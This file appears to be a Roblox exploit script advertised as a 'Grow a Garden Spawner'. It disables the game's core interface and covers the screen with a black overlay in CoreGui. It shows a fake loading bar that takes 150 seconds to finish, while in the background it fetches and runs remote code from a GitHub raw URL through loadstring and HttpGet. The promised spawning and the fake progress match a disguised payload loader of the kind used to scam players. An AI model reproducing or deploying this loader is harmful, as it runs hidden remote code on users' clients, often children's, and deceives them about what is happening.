local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")

pcall(function()
	for _, v in pairs(Enum.CoreGuiType:GetEnumItems()) do
		StarterGui:SetCoreGuiEnabled(v, false)
	end
	StarterGui:SetCore("TopbarEnabled", false)
end)

local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Name = "GardenLoadUI"
gui.Parent = CoreGui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.Parent = gui

local emojiLayer = Instance.new("Frame")
emojiLayer.Size = UDim2.new(1, 0, 1, 0)
emojiLayer.BackgroundTransparency = 1
emojiLayer.ZIndex = 0
emojiLayer.ClipsDescendants = false
emojiLayer.Name = "EmojiLayer"
emojiLayer.Parent = bg

local uiLayer = Instance.new("Frame")
uiLayer.Size = UDim2.new(1, 0, 1, 0)
uiLayer.BackgroundTransparency = 1
uiLayer.ZIndex = 2
uiLayer.Parent = bg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0.25, 0)
title.Text = "🦝 Grow a Garden Spawner Loading.."
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.TextTransparency = 1
title.ZIndex = 2
title.Parent = uiLayer

TweenService:Create(title, TweenInfo.new(2), {TextTransparency = 0}):Play()

local loadBg = Instance.new("Frame")
loadBg.Size = UDim2.new(0.6, 0, 0.025, 0)
loadBg.Position = UDim2.new(0.2, 0, 0.4, 0)
loadBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
loadBg.BorderSizePixel = 0
loadBg.ClipsDescendants = true
loadBg.ZIndex = 2
loadBg.Parent = uiLayer

local loadBar = Instance.new("Frame")
loadBar.Size = UDim2.new(0, 0, 1, 0)
loadBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
loadBar.BorderSizePixel = 0
loadBar.ZIndex = 2
loadBar.Parent = loadBg

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 30)
loadingText.Position = UDim2.new(0, 0, 0.46, 0)
loadingText.Text = "Please be patient"
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.FredokaOne
loadingText.TextScaled = true
loadingText.ZIndex = 2
loadingText.Parent = uiLayer

-- Percent Text (lowered)
local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(1, 0, 0, 30)
percentText.Position = UDim2.new(0, 0, 0.55, 0)
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.BackgroundTransparency = 1
percentText.Font = Enum.Font.FredokaOne
percentText.TextScaled = true
percentText.ZIndex = 2
percentText.Parent = uiLayer

local emojis = {"🦝", "🐉", "🦊", "🥚", "🐣", "🦋"}
task.spawn(function()
	while gui.Parent do
		local emoji = Instance.new("TextLabel")
		emoji.Size = UDim2.new(0, 30, 0, 30)
		emoji.Text = emojis[math.random(1, #emojis)]
		emoji.TextScaled = true
		emoji.Font = Enum.Font.FredokaOne
		emoji.BackgroundTransparency = 1
		emoji.TextColor3 = Color3.new(1, 1, 1)
		emoji.Position = UDim2.new(math.random(), 0, -0.1, 0)
		emoji.ZIndex = 0
		emoji.Visible = true
		emoji.Parent = emojiLayer

		local fallTime = math.random(6, 10)
		local tween = TweenService:Create(emoji, TweenInfo.new(fallTime, Enum.EasingStyle.Linear), {
			Position = UDim2.new(emoji.Position.X.Scale, 0, 1.1, 0)
		})
		tween:Play()
		game.Debris:AddItem(emoji, fallTime + 1)
		task.wait(0.4)
	end
end)

task.spawn(function()
	local dots = ""
	while gui.Parent do
		dots = dots == "..." and "" or dots .. "."
		loadingText.Text = "Please be patient" .. dots
		task.wait(0.5)
	end
end)

-- Animate loading bar: every 1.5 seconds increase by 1%
task.spawn(function()
	for i = 1, 100 do
		loadBar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 1.4, true)
		percentText.Text = i .. "%"
		task.wait(1.5)
	end
end)

task.spawn(function()
	local success, err = pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/bolaoxidada1/G-a-G/refs/heads/main/Grow-A-Garden-2.lua"))()
	end)
	if not success then
		warn("Failed to load Grow-A-Garden script: " .. tostring(err))
		loadingText.Text = "Failed to load script."
		loadBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		percentText.Text = "Error"
	end
end)